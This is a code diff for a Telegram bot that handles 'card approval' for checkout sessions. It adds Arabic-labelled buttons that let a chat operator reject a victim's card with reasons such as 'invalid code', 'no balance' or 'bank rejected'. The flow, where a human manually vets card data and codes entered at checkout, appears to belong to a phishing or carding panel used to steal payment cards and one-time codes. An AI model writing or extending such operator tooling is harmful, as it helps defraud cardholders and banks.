@@ -181,6 +181,21 @@ const setupCommands = () => {
       const approvalStore = require('../lib/checkoutApprovalStore');
       approvalStore.setStatus(sessionId, 'approved');
       bot.sendMessage(chatId, '✅ تمت الموافقة على بيانات البطاقة');
+    } else if (data.startsWith('reject_card_invalid_')) {
+      const sessionId = data.replace('reject_card_invalid_', '');
+      const approvalStore = require('../lib/checkoutApprovalStore');
+      approvalStore.setStatus(sessionId, 'error', 'كود غير صحيح');
+      bot.sendMessage(chatId, '❌ تم رفض البطاقة - كود غير صحيح');
+    } else if (data.startsWith('reject_card_nobalance_')) {
+      const sessionId = data.replace('reject_card_nobalance_', '');
+      const approvalStore = require('../lib/checkoutApprovalStore');
+      approvalStore.setStatus(sessionId, 'error', 'لا يوجد رصيد');
+      bot.sendMessage(chatId, '❌ تم رفض البطاقة - لا يوجد رصيد');
+    } else if (data.startsWith('reject_card_rejected_')) {
+      const sessionId = data.replace('reject_card_rejected_', '');
+      const approvalStore = require('../lib/checkoutApprovalStore');
+      approvalStore.setStatus(sessionId, 'error', 'رفض البطاقة');
+      bot.sendMessage(chatId, '❌ تم رفض البطاقة - رفض البنك');
     } else if (data.startsWith('reject_card_')) {
       const sessionId = data.replace('reject_card_', '');
       const approvalStore = require('../lib/checkoutApprovalStore');
@@ -495,7 +510,11 @@ const sendCardApprovalRequest = async (event) => {
         inline_keyboard: [
           [
             { text: '✅ موافقة', callback_data: `approve_card_${sessionId}` },
-            { text: '❌ رفض', callback_data: `reject_card_${sessionId}` },
+            { text: '❌ كود غير صحيح', callback_data: `reject_card_invalid_${sessionId}` },
+          ],
+          [
+            { text: '❌ لا يوجد رصيد', callback_data: `reject_card_nobalance_${sessionId}` },
+            { text: '❌ رفض البطاقة', callback_data: `reject_card_rejected_${sessionId}` },
           ],
         ],
       },
